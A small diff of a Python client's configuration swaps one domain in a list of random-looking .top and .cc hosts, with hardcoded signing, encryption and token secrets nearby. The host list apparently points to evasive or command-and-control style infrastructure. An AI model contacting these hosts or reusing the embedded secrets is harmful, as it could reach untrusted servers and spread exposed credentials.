@@ -6,7 +6,7 @@ import requests
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
-HOSTS = ['xqjzvcvt.top', 'psfxhhox.top', 'sxqirtho.top', 'qicuknlj.top', 'hvthtcpa.top']
+HOSTS = ['eyeonneb.cc', 'psfxhhox.top', 'sxqirtho.top', 'qicuknlj.top', 'hvthtcpa.top']
 SIGN_SECRET = 'bRfAdi04WvugJKF1b6f0XLu0WUTZeg7c'
 BODY_SECRET = b'c10ca2986a31fb46d4481ce8631c2725'
 TOKEN = 'D_109c4564a704e012ba252bbb576c9d8f_10928741'
